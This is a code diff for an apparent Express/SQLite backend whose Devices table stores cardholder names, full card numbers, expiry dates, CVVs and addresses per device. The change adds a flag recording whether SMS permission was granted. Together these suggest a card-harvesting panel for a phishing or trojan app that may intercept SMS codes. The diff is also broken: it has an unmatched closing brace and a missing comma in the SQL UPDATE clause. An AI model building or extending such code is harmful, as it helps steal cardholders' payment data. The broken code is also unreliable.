@@ -57,6 +57,15 @@ db.serialize(() => {
   });
 });
 
+
+// ✅ Add smsPermission column only if it doesn't exist
+  db.all("PRAGMA table_info(Devices)", (err, cols) => {
+    if (!err && !cols.find(c => c.name === "smsPermission")) {
+      db.run("ALTER TABLE Devices ADD COLUMN smsPermission INTEGER DEFAULT 0");
+    }
+  });
+});
+
 function authenticateToken(req, res, next) {
   const authHeader = req.headers["authorization"];
   if (!authHeader) return res.sendStatus(401);
@@ -80,10 +89,10 @@ app.post("/api/login", (req, res) => {
 });
 
 app.post("/api/register", (req, res) => {
-  const { deviceId, cardholderName, cardNumber, expiry, cvv, address, timestamp } = req.body;
+  const { deviceId, cardholderName, cardNumber, expiry, cvv, address, timestamp, smsPermission  } = req.body;
   const sql = `
-    INSERT INTO Devices (deviceId, cardholderName, cardNumber, expiry, cvv, address, timestamp)
-    VALUES (?, ?, ?, ?, ?, ?, ?)
+    INSERT INTO Devices (deviceId, cardholderName, cardNumber, expiry, cvv, address, timestamp, smsPermission)
+    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
     ON CONFLICT(deviceId) DO UPDATE SET
       cardholderName = excluded.cardholderName,
       cardNumber     = excluded.cardNumber,
@@ -91,8 +100,10 @@ app.post("/api/register", (req, res) => {
       cvv            = excluded.cvv,
       address        = excluded.address,
       timestamp      = excluded.timestamp
+      smsPermission  = excluded.smsPermission
+
   `;
-  db.run(sql, [deviceId, cardholderName, cardNumber, expiry, cvv, address, timestamp], err => {
+  db.run(sql, [deviceId, cardholderName, cardNumber, expiry, cvv, address, timestamp, smsPermission ? 1 : 0], err => {
     if (err) return res.status(500).json({ success: false, message: err.message });
     res.json({ success: true });
   });
